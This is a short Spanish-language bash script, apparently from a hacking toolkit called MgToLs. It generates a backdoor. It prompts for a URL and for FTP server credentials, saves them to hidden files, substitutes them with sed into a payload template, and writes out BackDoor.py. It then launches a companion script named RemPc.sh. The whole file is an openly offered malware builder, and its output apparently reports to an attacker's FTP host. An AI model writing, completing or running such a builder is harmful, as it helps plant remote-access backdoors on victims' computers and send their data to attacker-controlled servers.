mkdir $HOME/MgToLs/BackDoor/
bash .banner
read -p "Introduce la url que copiaste anteriormente: " url
echo ""
read -p "Introduce tu url de ftp: " urlf
echo ""
read -p "Introduce tu usuario de ftp: " cor
echo ""
read -sp "Introduce tu contraseña ftp: " pass
bash .banner

# Zona guardar

lo=$(echo "$url" > .url)
li=$(echo "$cor" > .ftpu)
lp=$(echo "$pass" > .ftpp)
ja=$(echo "$urlf" > .ftpw)

cas=$(cat .base | sed "s%urlftp%$urlf%g")
cae=$(echo "$cas" | sed "s%usrftp%$cor%g")
car=$(echo "$cae" | sed "s%passftp%$pass%g")
cat=$(echo "$car" | sed "s%urlxd%$url%g")
cay=$(echo "$cat" > .temp)
#python .crpy

cp .temp -r $HOME/MgToLs/BackDoor/BackDoor.py
bash .banner
echo "BackDoor creado y guardado exitosamente en: $HOME/MgToLs/BackDoor/"
echo ""
echo "Presiona una tecla para continuar..."
read pause
bash RemPc.sh
